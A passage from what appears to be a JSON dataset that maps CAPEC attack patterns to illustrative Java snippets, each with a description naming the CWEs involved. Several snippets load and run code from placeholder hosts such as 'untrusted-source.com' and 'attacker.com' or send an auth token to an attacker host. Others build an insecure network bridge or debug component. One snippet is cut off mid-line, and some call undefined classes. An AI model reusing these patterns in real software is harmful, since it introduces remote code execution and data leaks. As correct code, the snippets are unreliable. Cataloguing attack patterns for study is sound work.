        "description": "This Java code snippet demonstrates a malicious DHCP server that spoofs DHCP traffic to redirect network traffic or deny service to DHCP. It establishes a communication channel without properly ensuring it is communicating with the correct endpoint, allowing for authentication bypass by spoofing. The code relies on IP address for authentication and is vulnerable to capture-replay attacks. The destination in the communication channel is not correctly specified, making it possible for an adversary to redirect network traffic."
    },
    {
        "capec_id": "698",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousExtension {\n    public static void main(String[] args) throws Exception {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class EvilClass { public static void doEvil() { // malicious code here }}\";\n        CompilerManager cm = CompilerManager.getInstance();\n        cm.compile(maliciousCode, \"EvilClass\");\n\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\"http://untrusted-source.com/evil.jar\");\n        URLClassLoader ucl = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = ucl.loadClass(\"EvilClass\");\n        Object instance = clazz.newInstance();\n        clazz.getMethod(\"doEvil\").invoke(instance);\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL downloadUrl = new URL(\"http://untrusted-source.com/maliciousCode.java\");\n        byte[] codeBytes = new byte[1024];\n        int bytesRead = downloadUrl.openStream().read(codeBytes);\n        String downloadedCode = new String(codeBytes, 0, bytesRead);\n        cm.compile(downloadedCode, \"MaliciousClass\");\n\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", \"http://untrusted-source.com/lib/\");\n        System.loadLibrary(\"maliciousLib\");\n    }\n}\n",
        "description": "A Java code snippet that demonstrates a malicious extension that downloads and executes untrusted code, includes functionality from an untrusted control sphere, and uses an untrusted search path. This code embodies the main idea of the CAPEC, which involves an adversary tricking a user into installing a malicious extension into existing trusted software."
    },
    {
        "capec_id": "699",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class VulnerableMonitorSignal {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates a vulnerable program that transmits sensitive information in cleartext over a network, which can be captured by an attacker to eavesdrop on the content of an external monitor. The program uses a DatagramSocket to send packets containing confidential information, which can be intercepted by an attacker. The code also represents a covert channel, as the signal emitted by the video port or cable can be used to transfer information in a way not intended by the system's designers. Additionally, the program does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information."
    },
    {
        "capec_id": "700",
        "code_snippet": "public class BoundaryDeviceBridge {\n    private Socket trustedSocket;\n    private Socket untrustedSocket;\n    \n    public BoundaryDeviceBridge(Socket trustedSocket, Socket untrustedSocket) {\n        this.trustedSocket = trustedSocket;\n        this.untrustedSocket = untrustedSocket;\n    }\n    \n    public void bridgeChannels() throws IOException {\n        BufferedReader trustedReader = new BufferedReader(new InputStreamReader(trustedSocket.getInputStream()));\n        PrintWriter untrustedWriter = new PrintWriter(untrustedSocket.getOutputStream(), true);\n        \n        String message;\n        while ((message = trustedReader.readLine()) != null) {\n            untrustedWriter.println(message);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable boundary device bridge that connects a trusted network to an untrusted network. The bridge does not properly verify the identity of actors at both ends of the communication channel (CWE-300), nor does it ensure the integrity of the channel during transmission (CWE-924). Additionally, it mixes trusted and untrusted data in the same data structure (CWE-501) and does not properly restrict the communication channel to intended endpoints (CWE-923). An adversary can exploit this vulnerability to create a channel to bridge trusted and untrusted networks."
    },
    {
        "capec_id": "701",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.net.URLEncoder;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class RemoteDesktopExploit {\n    public static void main(String[] args) throws IOException {\n        // CWE-830: Inclusion of Web Functionality from an Untrusted Source\n        String untrustedDomain = \"http://attacker.com/malicious_widget\";\n        URL url = new URL(untrustedDomain);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            // Trusting the client-side authentication mechanism\n            if (inputLine.contains(\"authenticated=true\")) {\n                // CWE-294: Authentication Bypass by Capture-replay\n                // Replaying the authentication token\n                String authToken = inputLine.split(\"=\")[1];\n                establishRemoteDesktopConnection(authToken);\n            }\n        }\n        in.close();\n    }\n\n    private static void establishRemoteDesktopConnection(String authToken) throws IOException {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // Not verifying the authenticity of the authentication token\n        URL remoteDesktopUrl = new URL(\"http://attacker.com/remote_desktop\" + URLEncoder.encode(authToken, \"UTF-8\"));\n        HttpURLConnection remoteConn = (HttpURLConnection) remoteDesktopUrl.openConnection();\n        remoteConn.setRequestMethod(\"GET\");\n        // CWE-368: Context Switching Race Condition\n        // Switching to a new context without proper synchronization\n        remoteConn.connect();\n        // Establishing the remote desktop connection\n        System.out.println(\"Remote desktop connection established.\");\n    }\n}\n",
        "description": "Java code snippet that demonstrates the CAPEC, which involves exploiting a web browser to establish an unnoticed remote desktop connection to the attacker's system. The code includes vulnerabilities related to CWE-830 (inclusion of web functionality from an untrusted source), CWE-602 (client-side enforcement of server-side security), CWE-294 (authentication bypass by capture-replay), CWE-345 (insufficient verification of data authenticity), and CWE-368 (context switching race condition)."
    },
    {
        "capec_id": "702",
        "code_snippet": "public class DebugComponent {\n    private boolean isAdmin = false;\n    private boolean isDebugEnabled = false;\n\n    public void enableDebugMode() {\n        isDebugEnabled = true;\n    }\n\n    public void executeDebugFunctionality(String functionName) {\n        if (isDebugEnabled) {\n            if (functionName.equals(\"readInternalRegisters\")) {\n                readInternalRegisters();\n            } else if (functionName.equals(\"injectErrorsIntoRedundantBlock\")) {\n                injectErrorsIntoRedundantBlock();\n            } else if (functionName.equals(\"skipSecurityCriticalInstructions\")) {\n                skipSecurityCriticalInstructions();\n            } else if (functionName.equals(\"storeTraceDataInUnprotectedLocation\")) {\n                storeTraceDataInUnprotectedLocation();\n            }\n        }\n    }\n\n    private void readInternalRegisters() {\n        // read internal registers without checking authorization\n        System.out.println(\"Reading internal registers...\");\n    }\n\n    private void injectErrorsIntoRedundantBlock() {\n        // inject errors into redundant block without checking authorization\n        System.out.println(\"Injecting errors into redundant block...\");\n    }\n\n    private void skipSecurityCriticalInstructions() {\n        // skip security-critical instructions without checking authorization\n        System.out.println(\"Skipping security-critical instructions...\");\n    }\n\n    private void storeTraceDataInUnprotectedLocation() {\n        // store trace data in unprotected location without checking authorization\n        System.out.println(\"Storing trace data in unprotected location...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting incorrect chaining or granularity of hardware debug components. The code allows unauthorized access to debug functionality by not checking authorization on a per-function basis. The CWEs embodied in this code include CWE-1296 (Incorrect Chaining or Granularity of Debug Components), CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy), CWE-1191 (On-Chip Debug and Test Interface With Improper Access Control), CWE-1332 (Improper Handling of Faults that Lead to Instruction Skips), and CWE-1323 (Improper Management of Sensitive Trace Data)."
    }
]